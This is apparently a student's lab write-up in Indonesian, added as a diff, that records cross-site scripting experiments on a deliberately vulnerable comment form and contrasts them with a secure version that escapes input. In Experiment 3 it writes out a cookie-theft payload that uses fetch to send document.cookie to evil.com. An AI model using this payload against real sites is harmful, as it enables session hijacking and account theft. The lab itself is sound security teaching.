@@ -1,0 +1,32 @@
+Eksperimen 1:
+Saat saya klik Kirim Komentar, Di kolom komentar ada tulisan Hacker.
+
+Eksperimen 2:
+Kenapa ini bekerja padahal tidak ada tag <script>?
+Karena:
+- Browser mengeksekusi JavaScript di atribut event handler HTML
+  (Contohnya: onerror, onclick, onload, dll)
+- Atribut ini tetap dianggap kode JavaScript oleh browser
+Jadi tanpa tag <script>, JavaScript tetap dieksekusi lewat atribut event.
+
+Eksperimen 3:
+Cookie apa yang muncul di alert?
+Cookie: sessionTest=hello; persistentTest=world; visitCount=3; sessionId=abc123xyz; username=JohnDoe
+
+Jika attacker mengganti alert() dengan fetch('https://evil.com?cookie=' + document.cookie), apa yang akan terjadi?
+- Browser korban akan mengirim request ke evil.com
+- Cookie korban dikirim sebagain parameter URL
+- Server attacker menerima dan menyimpan cookie
+
+Eksperimen 4:
+Background color dari website tersebut berubah warna
+
+Eksperimen 5:
+Before After dari Eksperimen 1-4:
+Eksperimen 1 = Di bagian komentar, kelihatan scriptnya dalam bentuk text
+Eksperimen 2 = Sama seperti di Eksperimen 1, script ditunjukkan dalam bentuk text di komentar
+Eksperimen 3 = Sama seperti Eksperimen sebelumnya, hanya berbentuk teks di bagian komentar
+Eksperimen 4 = Background color kali ini tidak berubah, dan sama seperti sebelumnya (Berbentuk text)
+
+Eksperimen 6:
+Versi secure tidak vulnerable terhadap XSS karena input user tidak diproses sebagai HTML, tetapi sebagai text biasa aja.
